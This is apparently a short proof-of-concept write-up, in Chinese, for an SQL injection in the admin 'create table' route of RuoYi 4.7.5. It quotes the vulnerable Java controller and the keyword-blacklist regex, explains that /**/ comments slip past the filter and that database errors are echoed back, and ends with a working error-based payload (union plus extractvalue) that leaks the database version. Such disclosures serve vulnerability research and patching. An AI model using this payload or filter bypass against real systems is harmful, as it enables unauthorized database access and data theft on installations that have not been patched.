# ruoyi-4.7.5-vuln-poc
ruoyi-4.7.5 后台
com/ruoyi/generator/controller/GenController 下/tool/gen/createTable路由存在sql注入。
```
@RequiresRoles("admin")
@Log(title = "创建表", businessType = BusinessType.OTHER)
@PostMapping("/createTable")
@ResponseBody
public AjaxResult create(String sql)
{
    try
    {
        SqlUtil.filterKeyword(sql);
        List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);
        List<String> tableNames = new ArrayList<>();
        for (SQLStatement sqlStatement : sqlStatements)
        {
            if (sqlStatement instanceof MySqlCreateTableStatement)
            {
                MySqlCreateTableStatement createTableStatement = (MySqlCreateTableStatement) sqlStatement;
                if (genTableService.createTable(createTableStatement.toString()))
                {
                    String tableName = createTableStatement.getTableName().replaceAll("`", "");
                    tableNames.add(tableName);
                }
            }
        }
        List<GenTable> tableList = genTableService.selectDbTableListByNames(tableNames.toArray(new String[tableNames.size()]));
        String operName = Convert.toStr(PermissionUtils.getPrincipalProperty("loginName"));
        genTableService.importGenTable(tableList, operName);
        return AjaxResult.success();
    }
    catch (Exception e)
    {
        logger.error(e.getMessage(), e);
        return AjaxResult.error("创建表结构异常[" + e.getMessage() + "]");
    }
}
```

这段代码可以用过/**/绕过关键字
```
public static String SQL_REGEX = "select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare ";
```
由于这段代码会将错误信息回显
```
logger.error(e.getMessage(), e);
        return AjaxResult.error("创建表结构异常[" + e.getMessage() + "]");
```
poc
```
sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
```
![vuln-poc](https://img-blog.csdnimg.cn/130467dd6fb24f868fbe5668a2b4bd9c.png)
        
